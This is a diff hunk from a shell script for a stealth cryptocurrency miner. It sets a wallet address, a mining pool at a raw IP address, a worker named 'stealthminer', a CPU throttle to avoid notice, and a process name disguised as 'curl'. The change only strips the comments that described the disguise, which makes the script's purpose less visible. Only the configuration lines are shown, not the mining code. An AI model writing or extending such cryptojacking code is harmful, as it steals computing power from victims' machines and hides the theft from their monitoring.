@@ -4,8 +4,8 @@
 WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
 POOL="134.199.197.80:443"
 WORKER_ID="stealthminer"
-CPU_USAGE="50" # Percentage (0-100)
-FAKE_NAME="curl" # Disguised binary name
+CPU_USAGE="50"
+FAKE_NAME="curl"
 THREADS=$(nproc)
 MAX_THREADS=$((THREADS * CPU_USAGE / 100))
 
